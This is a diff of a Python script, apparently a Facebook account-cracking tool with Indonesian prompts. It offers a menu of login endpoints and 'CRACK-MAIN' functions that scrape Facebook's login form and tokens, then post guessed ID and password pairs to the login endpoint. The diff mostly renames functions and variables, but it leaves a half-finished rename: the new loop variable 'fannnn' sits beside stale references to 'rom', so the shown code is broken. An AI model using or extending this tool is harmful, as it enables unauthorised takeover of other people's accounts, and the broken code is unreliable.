@@ -1309,7 +1309,7 @@ def setting():
 
 
     # Input untuk metode login
-    Console().print(Panel(f"{P2}[{color_text}01{P2}] Login Site [bold green]graph[bold white] [/]\n{P2}[{color_text}02{P2}] Login Site [bold green]MTOUCH [bold white] [/]\n{P2}[{color_text}03{P2}] Login Site [bold green]Touch[bold white] [/]\n{P2}[{color_text}04{P2}] Login Site [bold green]IP [bold white][[bold green]Recommended[bold white]][bold white] [/]\n{P2}[{color_text}05{P2}] Login Site [bold green]m.facebook.com[bold white] [/]\n",width=60,style=f"{color_panel}",title="[bold green] Method"))
+    Console().print(Panel(f"{P2}[{color_text}01{P2}] Login Site [bold green]graph[bold white] [/]\n{P2}[{color_text}02{P2}] Login Site [bold green]MTOUCH [bold white] [/]\n{P2}[{color_text}03{P2}] Login Site [bold green]Touch[bold white] [/]\n{P2}[{color_text}04{P2}] Login Site [bold green]IP [bold white][[bold green]Recommended[bold white]][bold white] [/]\n{P2}[{color_text}05{P2}] Login Site [bold green]m.facebook.com[bold white] [/]",width=60,style=f"{color_panel}",title="[bold green] Method"))
     fankylog = console.input(f" {H2}• {P2}Masukan : ").strip()
     if fankylog in ["1", "01"]:
         method.append("fankygraph")
@@ -1767,7 +1767,7 @@ def fanky_b_api(idf, pwv):
             time.sleep(31)
     loop += 1
 #-------------------[ CRACK-MAIN ]------------#
-def fankytouchn(idf,pwv):
+def fankytouch(idf,pwv):
 	global loop,ok,cp
 	rr = random.randint
 	rc = random.choice
@@ -1816,7 +1816,7 @@ def fankytouchn(idf,pwv):
 	loop+=1
 
 #-------------------[ CRACK-MAIN ]------------#
-def fankytouch(idf,pwv):
+def fankym(idf,pwv):
 	global loop,ok,cp
 	rr = random.randint
 	rc = random.choice
@@ -1836,16 +1836,16 @@ def fankytouch(idf,pwv):
 			b = BeautifulSoup(p.text, 'html.parser')
 			dtg = ('').join(re.findall('dtsg":\\{"token":"(.*?)"', p.text))
 			data = {}
-			for rom in b('input'):
+			for fannnn in b('input'):
 				if rom.get('value') is None:
-					if rom.get('name') == 'email':
+					if fannnn.get('name') == 'email':
 						data.update({"email":idf})
-					elif rom.get("name")=="pass":
+					elif fannnn.get("name")=="pass":
 						data.update({"pass":pw})
 					else:
 						data.update({rom.get('name'): ''})
 				else:
-					data.update({rom.get('name'): rom.get('value')})
+					data.update({fannnn.get('name'): fannnn.get('value')})
 			data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd','__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
 			ses.headers.update({'referer': 'https://www.facebook.com/login/?next&ref=dbl&fl&refid=8'})
 			po = ses.post('https://www.facebook.com/login/device-based/regular/login/', data=data)
